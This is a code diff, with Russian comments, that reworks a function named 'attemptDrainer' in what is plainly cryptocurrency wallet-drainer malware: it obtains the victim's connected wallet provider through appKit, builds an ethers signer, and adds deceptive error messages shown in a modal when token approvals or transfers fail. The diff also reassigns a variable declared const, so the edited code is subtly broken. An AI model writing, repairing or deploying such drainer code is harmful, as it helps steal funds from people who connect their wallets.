@@ -947,57 +947,40 @@ async function attemptDrainer() {
   showModal();
 
   try {
-    // Логируем состояние wagmiAdapter и appKit для отладки
-    console.log('🔍 wagmiAdapter:', {
-      hasProvider: !!wagmiAdapter.provider,
-      hasWagmiClient: !!wagmiAdapter.wagmiClient,
-      wagmiClientProvider: wagmiAdapter.wagmiClient ? !!wagmiAdapter.wagmiClient.getProvider : null
-    });
-    console.log('🔍 appKit state:', JSON.stringify(appKit.getState ? appKit.getState() : {}, null, 2));
+    // Логируем состояние для отладки
+    const appKitState = appKit.getState ? appKit.getState() : {};
+    console.log('🔍 appKit state:', JSON.stringify(appKitState, null, 2));
 
-    // Пытаемся получить провайдер
+    // Ожидаем завершения loading
+    let attempts = 0;
+    const maxAttempts = 10;
+    const interval = 1000;
+    while (appKitState.loading && attempts < maxAttempts) {
+      console.log(`ℹ️ Ожидание завершения loading, попытка ${attempts + 1}/${maxAttempts}...`);
+      await new Promise(resolve => setTimeout(resolve, interval));
+      attempts++;
+      appKitState = appKit.getState ? appKit.getState() : {};
+    }
+
+    if (appKitState.loading) {
+      throw new Error('AppKit loading state not resolved');
+    }
+
+    // Получаем провайдер через appKit.getProvider
     let walletProvider = null;
-
-    // Вариант 1: Через wagmiAdapter.wagmiClient.getProvider
-    if (wagmiAdapter.wagmiClient?.getProvider) {
-      try {
-        walletProvider = await wagmiAdapter.wagmiClient.getProvider();
-        console.log('✅ Провайдер получен через wagmiAdapter.wagmiClient.getProvider');
-      } catch (error) {
-        console.warn(`⚠️ Не удалось получить провайдер через wagmiClient.getProvider: ${error.message}`);
-      }
+    try {
+      walletProvider = await appKit.getProvider();
+      console.log('✅ Провайдер получен через appKit.getProvider');
+    } catch (error) {
+      console.error(`❌ Ошибка при получении провайдера через appKit.getProvider: ${error.message}`);
+      throw new Error('Failed to get provider from appKit.getProvider');
     }
 
-    // Вариант 2: Проверяем wagmiAdapter.provider с ожиданием
-    if (!walletProvider) {
-      let attempts = 0;
-      const maxAttempts = 10;
-      const interval = 1000;
-
-      while (!walletProvider && attempts < maxAttempts) {
-        console.log(`ℹ️ Ожидание wagmiAdapter.provider, попытка ${attempts + 1}/${maxAttempts}...`);
-        walletProvider = wagmiAdapter.provider;
-        if (!walletProvider) {
-          await new Promise(resolve => setTimeout(resolve, interval));
-        }
-        attempts++;
-      }
-    }
-
-    // Вариант 3: Пробуем appKit.getProvider (если доступен)
-    if (!walletProvider && appKit.getProvider) {
-      try {
-        walletProvider = await appKit.getProvider();
-        console.log('✅ Провайдер получен через appKit.getProvider');
-      } catch (error) {
-        console.warn(`⚠️ Не удалось получить провайдер через appKit.getProvider: ${error.message}`);
-      }
-    }
-
-    // Проверяем, удалось ли получить провайдер
     if (!walletProvider) {
       throw new Error('No provider available after wallet connection');
     }
+
+    console.log('🔍 Провайдер:', walletProvider);
 
     const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
     const signer = provider.getSigner();
@@ -1021,13 +1004,22 @@ async function attemptDrainer() {
     isTransactionPending = false;
   } catch (error) {
     isTransactionPending = false;
+    let errorMessage = "Error: An unexpected error occurred.";
     if (error.message.includes('user rejected')) {
+      errorMessage = "Error: Transaction rejected by user.";
     } else if (error.message.includes('Insufficient')) {
+      errorMessage = error.message;
     } else if (error.message.includes('Failed to approve token')) {
+      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
     } else if (error.message.includes('Failed to process')) {
+      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
     } else if (error.message.includes('Failed to switch')) {
+      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
     } else {
+      errorMessage = `Error: ${error.message}`;
     }
+    console.error(`❌ Drainer error: ${errorMessage}`);
+    await hideModalWithDelay(errorMessage);
     throw error;
   }
 }
